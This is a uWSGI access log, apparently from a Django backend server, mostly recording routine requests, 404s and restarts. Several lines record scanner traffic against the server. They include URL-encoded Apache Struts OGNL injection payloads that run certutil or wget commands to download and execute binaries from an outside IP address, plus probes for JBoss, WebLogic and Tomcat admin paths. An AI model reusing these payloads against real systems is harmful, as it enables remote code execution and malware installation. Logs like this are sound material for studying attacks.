+[pid: 17591|app: 0|req: 75/89] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 01:41:04 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 76/90] 139.162.79.87 () {34 vars in 390 bytes} [Sun Dec  2 01:46:25 2018] GET / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 77/91] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 02:30:12 2018] POST / => generated 74 bytes in 13 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 78/92] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 02:56:34 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 79/93] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 03:22:23 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 80/94] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 04:10:01 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 81/95] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 04:34:47 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 82/96] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 05:27:48 2018] POST / => generated 74 bytes in 13 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 83/97] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 06:17:50 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 84/98] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 07:32:21 2018] POST / => generated 74 bytes in 14 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 85/99] 45.77.154.54 () {30 vars in 325 bytes} [Sun Dec  2 08:22:03 2018] GET / => generated 74 bytes in 63 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 86/100] 45.77.154.54 () {30 vars in 405 bytes} [Sun Dec  2 08:22:03 2018] GET /ws_utc/resources/setting/options/general => generated 114 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 15/101] 45.77.154.54 () {38 vars in 2361 bytes} [Sun Dec  2 08:22:04 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 16/102] 45.77.154.54 () {38 vars in 2591 bytes} [Sun Dec  2 08:22:04 2018] POST / => generated 74 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 87/103] 45.77.154.54 () {36 vars in 641 bytes} [Sun Dec  2 08:22:04 2018] POST / => generated 74 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 88/104] 45.77.154.54 () {36 vars in 641 bytes} [Sun Dec  2 08:22:05 2018] POST / => generated 74 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 89/105] 45.77.154.54 () {32 vars in 1824 bytes} [Sun Dec  2 08:22:05 2018] GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action => generated 755 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 90/106] 45.77.154.54 () {32 vars in 1216 bytes} [Sun Dec  2 08:22:05 2018] GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action => generated 480 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 115 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 17/107] 45.77.154.54 () {32 vars in 2127 bytes} [Sun Dec  2 08:22:06 2018] GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%20%26%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action => generated 921 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 115 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 18/108] 45.77.154.54 () {30 vars in 357 bytes} [Sun Dec  2 08:22:06 2018] GET /invoker/readonly => generated 90 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 91/109] 45.77.154.54 () {30 vars in 375 bytes} [Sun Dec  2 08:22:06 2018] GET /invoker/JMXInvokerServlet => generated 99 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 92/110] 45.77.154.54 () {30 vars in 371 bytes} [Sun Dec  2 08:22:07 2018] GET /jmx-console/HtmlAdaptor => generated 97 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 19/111] 45.77.154.54 () {30 vars in 349 bytes} [Sun Dec  2 08:22:07 2018] GET /orders.xhtml => generated 86 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 20/112] 45.77.154.54 () {30 vars in 325 bytes} [Sun Dec  2 08:22:07 2018] GET / => generated 74 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 93/113] 45.77.154.54 () {30 vars in 335 bytes} [Sun Dec  2 08:22:08 2018] GET /users => generated 79 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 94/114] 45.77.154.54 () {36 vars in 496 bytes} [Sun Dec  2 08:22:08 2018] PUT /dba_put1.jsp/ => generated 87 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 21/115] 45.77.154.54 () {30 vars in 349 bytes} [Sun Dec  2 08:22:09 2018] GET /dba_put1.jsp => generated 86 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 22/116] 45.77.154.54 () {30 vars in 349 bytes} [Sun Dec  2 08:22:09 2018] GET /manager/html => generated 86 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 95/117] 45.77.154.54 () {30 vars in 381 bytes} [Sun Dec  2 08:22:09 2018] GET /wls-wsat/CoordinatorPortType => generated 102 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 96/118] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 08:22:42 2018] POST / => generated 74 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 23/119] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 09:15:25 2018] POST / => generated 74 bytes in 12 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 97/120] 139.162.79.87 () {34 vars in 390 bytes} [Sun Dec  2 09:38:33 2018] GET / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 24/121] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 11:52:05 2018] POST / => generated 74 bytes in 52 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 98/122] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 12:16:36 2018] POST / => generated 74 bytes in 14 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 25/123] 210.195.148.127 () {26 vars in 281 bytes} [Sun Dec  2 15:14:37 2018] GET / => generated 74 bytes in 14 msecs (HTTP/1.0 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 99/124] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 16:03:03 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 100/125] 61.191.198.244 () {48 vars in 864 bytes} [Sun Dec  2 16:37:21 2018] POST /user/login => generated 43 bytes in 227 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 101/126] 61.191.198.244 () {44 vars in 739 bytes} [Sun Dec  2 16:37:22 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 26/127] 61.191.198.244 () {44 vars in 734 bytes} [Sun Dec  2 16:37:22 2018] GET /user/info?token=admin => generated 144 bytes in 20 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 27/128] 61.191.198.244 () {44 vars in 732 bytes} [Sun Dec  2 16:37:37 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 102/129] 61.191.198.244 () {44 vars in 727 bytes} [Sun Dec  2 16:37:38 2018] GET /data/calllistinfo => generated 565 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 103/130] 61.191.198.244 () {44 vars in 727 bytes} [Sun Dec  2 16:37:41 2018] GET /data/calllistinfo => generated 565 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 28/131] 61.191.198.244 () {44 vars in 734 bytes} [Sun Dec  2 16:37:58 2018] GET /user/info?token=admin => generated 144 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 104/132] 61.191.198.244 () {48 vars in 864 bytes} [Sun Dec  2 16:38:50 2018] POST /user/login => generated 43 bytes in 252 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 105/133] 61.191.198.244 () {48 vars in 864 bytes} [Sun Dec  2 16:40:04 2018] POST /user/login => generated 43 bytes in 254 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 106/134] 61.191.198.244 () {44 vars in 739 bytes} [Sun Dec  2 16:40:04 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 29/135] 61.191.198.244 () {44 vars in 734 bytes} [Sun Dec  2 16:40:05 2018] GET /user/info?token=admin => generated 144 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 30/136] 61.191.198.244 () {44 vars in 734 bytes} [Sun Dec  2 16:40:17 2018] GET /user/info?token=admin => generated 144 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 107/137] 61.191.198.244 () {44 vars in 734 bytes} [Sun Dec  2 16:45:40 2018] GET /user/info?token=admin => generated 144 bytes in 20 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 108/138] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 17:41:29 2018] POST / => generated 74 bytes in 15 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 109/139] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 18:08:38 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 110/140] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 18:58:18 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 111/141] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 20:17:22 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 112/142] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 20:43:15 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 113/143] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 22:17:51 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 114/144] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 22:41:08 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 115/145] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 23:06:08 2018] POST / => generated 74 bytes in 13 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 116/146] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 23:55:53 2018] POST / => generated 74 bytes in 17 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.17.1 (64bit) on [Sun Dec  2 16:30:58 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /root
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x562133f07100
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562133f07100 pid: 26151 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 26151)
+spawned uWSGI worker 1 (pid: 26154, cores: 2)
+spawned uWSGI worker 2 (pid: 26155, cores: 2)
+[pid: 26154|app: 0|req: 1/1] 61.191.198.244 () {48 vars in 864 bytes} [Mon Dec  3 00:31:12 2018] POST /user/login => generated 54 bytes in 422 msecs (HTTP/1.1 200) 6 headers in 203 bytes (1 switches on core 0)
+[pid: 26154|app: 0|req: 2/2] 61.191.198.244 () {48 vars in 864 bytes} [Mon Dec  3 00:31:15 2018] POST /user/login => generated 43 bytes in 295 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 26154|app: 0|req: 3/3] 61.191.198.244 () {44 vars in 739 bytes} [Mon Dec  3 00:31:17 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 26155|app: 0|req: 1/4] 61.191.198.244 () {44 vars in 734 bytes} [Mon Dec  3 00:31:17 2018] GET /user/info?token=admin => generated 144 bytes in 129 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 26155|app: 0|req: 2/5] 61.191.198.244 () {44 vars in 734 bytes} [Mon Dec  3 00:31:25 2018] GET /user/info?token=admin => generated 144 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 26155|app: 0|req: 3/6] 61.191.198.244 () {44 vars in 724 bytes} [Mon Dec  3 00:31:26 2018] OPTIONS /server/status => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 26154|app: 0|req: 4/7] 61.191.198.244 () {46 vars in 795 bytes} [Mon Dec  3 00:31:26 2018] GET /server/status => generated 27 bytes in 169 msecs (HTTP/1.1 500) 6 headers in 223 bytes (1 switches on core 0)
+[pid: 26154|app: 0|req: 5/8] 61.191.198.244 () {44 vars in 734 bytes} [Mon Dec  3 00:31:47 2018] GET /user/info?token=admin => generated 144 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 26154|app: 0|req: 6/9] 61.191.198.244 () {46 vars in 812 bytes} [Mon Dec  3 00:31:48 2018] GET /server/status => generated 27 bytes in 81 msecs (HTTP/1.1 500) 6 headers in 223 bytes (1 switches on core 0)
+[pid: 26154|app: 0|req: 7/10] 61.191.198.244 () {44 vars in 732 bytes} [Mon Dec  3 00:33:16 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 26154|app: 0|req: 8/11] 61.191.198.244 () {44 vars in 727 bytes} [Mon Dec  3 00:33:16 2018] GET /data/calllistinfo => generated 565 bytes in 8 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 26154|app: 0|req: 9/12] 61.191.198.244 () {44 vars in 727 bytes} [Mon Dec  3 00:33:28 2018] GET /data/calllistinfo => generated 565 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.17.1 (64bit) on [Sun Dec  2 16:34:38 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /root
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x55ce41408100
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ce41408100 pid: 26194 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 26194)
+spawned uWSGI worker 1 (pid: 26196, cores: 2)
+spawned uWSGI worker 2 (pid: 26197, cores: 2)
+[pid: 26197|app: 0|req: 1/1] 61.191.198.244 () {44 vars in 721 bytes} [Mon Dec  3 00:34:47 2018] OPTIONS /user/logout => generated 0 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 26197|app: 0|req: 2/2] 61.191.198.244 () {46 vars in 741 bytes} [Mon Dec  3 00:34:48 2018] POST /user/logout => generated 34 bytes in 93 msecs (HTTP/1.1 200) 6 headers in 211 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 1/3] 61.191.198.244 () {48 vars in 881 bytes} [Mon Dec  3 00:34:57 2018] POST /user/login => generated 43 bytes in 381 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 2/4] 61.191.198.244 () {44 vars in 734 bytes} [Mon Dec  3 00:34:57 2018] GET /user/info?token=admin => generated 144 bytes in 14 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 3/5] 61.191.198.244 () {46 vars in 812 bytes} [Mon Dec  3 00:35:04 2018] GET /server/status => generated 27 bytes in 122 msecs (HTTP/1.1 500) 6 headers in 223 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 4/6] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 00:42:58 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 5/7] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 01:31:06 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 6/8] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 01:55:11 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 7/9] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 02:18:19 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 8/10] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 02:42:18 2018] POST / => generated 74 bytes in 59 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 9/11] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 03:29:53 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 10/12] 107.170.205.134 () {34 vars in 396 bytes} [Mon Dec  3 03:29:56 2018] GET / => generated 74 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 11/13] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 04:18:05 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 12/14] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 05:06:54 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 13/15] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 05:28:33 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 14/16] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 05:53:24 2018] POST / => generated 74 bytes in 14 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 15/17] 185.153.198.208 () {38 vars in 490 bytes} [Mon Dec  3 06:17:59 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 16/18] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 06:42:43 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 26196|app: 0|req: 17/19] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 07:05:40 2018] POST / => generated 74 bytes in 12 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 26196|app: 0|req: 18/20] 185.153.198.206 () {38 vars in 490 bytes} [Mon Dec  3 07:31:39 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
